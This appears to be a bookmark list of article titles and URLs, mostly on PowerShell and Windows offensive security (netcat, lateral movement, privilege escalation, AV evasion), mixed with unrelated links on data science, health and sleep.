https://www.hackingtutorials.org/malware-analysis-tutorials/malware-types-explained/
Hacking with Netcat part 3: Advanced Techniques - Hacking Tutorials
https://www.hackingtutorials.org/networking/hacking-with-netcat-part-3-advanced-techniques/
Radiolab Presents: Gonads | WNYC Studios | Podcasts
https://www.wnycstudios.org/shows/radiolab/projects/radiolab-presents-gonads/
Microsoft Azure Notebooks - Online Jupyter Notebooks
https://notebooks.azure.com/ian-buckley/libraries/probabilistic-programming
What is the IP address 168.63.129.16? – Microsoft Azure Support Team Blog
https://blogs.msdn.microsoft.com/mast/2015/05/18/what-is-the-ip-address-168-63-129-16/
Bypassing Application Whitelisting with BGInfo | MSitPros Blog
https://msitpros.com/?p=3831
Daniel Bachler
http://danielbachler.de/
PowerHour: Community Lightning Demos!
https://powershell.org/2018/07/31/powerhour-community-lightning-demos/
The Best Hacking Books 2018 - Hacking Tutorials
https://www.hackingtutorials.org/infosec-books/the-best-hacking-books-2018/
No Win32_Process Needed – Expanding the WMI Lateral Movement Arsenal
https://www.cybereason.com/blog/wmi-lateral-movement-win32?hs_amp=true&hs_preview=UbvcDFUZ-5764480077&__twitter_impression=true
Mass PowerShell and WMImplant - FortyNorth Security
https://www.fortynorthsecurity.com/mass-powershell-and-wmimplant/
Ketogenic Diet Shows Promising Results for All Dementia Stages
https://universityhealthnews.com/daily/memory/ketogenic-diet-shows-promising-results-for-all-dementia-stages/
Module Worst Practices | Get-RandomProblems
https://chrislgardner.github.io/powershell/2018/08/03/module-worst-practices.html
Awesome Data Science Repository - Data Science Central
https://www.datasciencecentral.com/group/research/forum/topics/awesome-data-science-repository
On PowerShell Parameters – James O'Neill's Blog
https://jamesone111.wordpress.com/2018/07/30/on-powershell-parameters/amp/?__twitter_impression=true
Plot Graph in Powershell console | RidiCurious.com
https://ridicurious.com/2017/09/04/plot-graph-in-powershell-console/
Tools for Extracting Data and Text from PDFs - A Review - Open Knowledge Labs
http://okfnlabs.org/blog/2016/04/19/pdf-tools-extract-text-and-data-from-pdfs.html
Exploring APIs for likes and bookmarks - DEV Community 👩‍💻👨‍💻
https://dev.to/kehers/exploring-apis-for-likes-and-bookmarks-4afb
Linux security tools (top 100) - Linux Security Expert
https://linuxsecurity.expert/security-tools/top-100/
Powershell : How To Identify the Parameter that Accepts Pipeline Input - Ridicurious
https://ridicurious.com/2015/03/30/powershell-how-to-identify-the-parameter-that-accepts-pipeline-input/
Using WinRM Through Meterpreter - TrustedSec
https://www.trustedsec.com/2017/09/using-winrm-meterpreter/
3 ways to download files with PowerShell
https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell
How to Fall Asleep in 120 Seconds – Member Feature Stories – Medium
https://medium.com/s/story/combat-tested-training-unwind-and-sleep-anywhere-in-120-seconds-27d5307b7606
Data Mining Reveals Fundamental Pattern of Human Thinking
https://medium.com/mit-technology-review/data-mining-reveals-fundamental-pattern-of-human-thinking-7fc1d5e1d8b
Powershell: Text To Speech in 3 lines of code | Scripting Library
https://www.scriptinglibrary.com/languages/powershell/powershell-text-to-speech/
mattifestation/BHUSA2018_Sysmon: All materials from our Black Hat 2018 "Subverting Sysmon" talk
https://github.com/mattifestation/BHUSA2018_Sysmon
.NET Core Self-Contained and Framework-Dependent Deployments Explained
https://www.danielcrabtree.com/blog/496/net-core-self-contained-and-framework-dependent-deployments-explained
Test-NetConnection vs. Test-Connection – Testing a network connection with PowerShell – 4sysops
https://4sysops.com/archives/test-netconnection-vs-test-connection-testing-a-network-connection-with-powershell/
AutoKeras: The Killer of Google’s AutoML – Towards Data Science
https://towardsdatascience.com/autokeras-the-killer-of-googles-automl-9e84c552a319
The Developer’s Guide to Microsoft Azure eBook - August update is now available | Blog | Microsoft Azure
https://azure.microsoft.com/en-us/blog/the-developer-s-guide-to-microsoft-azure-ebook-august-update-is-now-available/
RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an…
https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6
Windows Privilege Escalation Guide
https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/
FuzzySecurity | Windows Privilege Escalation Fundamentals
http://www.fuzzysecurity.com/tutorials/16.html
Tim Arneaud: Windows Privilege Escalation - a cheatsheet
http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html?m=1
Home – Books + Videos – PowerShell.org
https://powershell.org/groups/books-videos/
Art of Anti Detection 1 – Introduction to AV & Detection Techniques – Pentest Blog
https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/
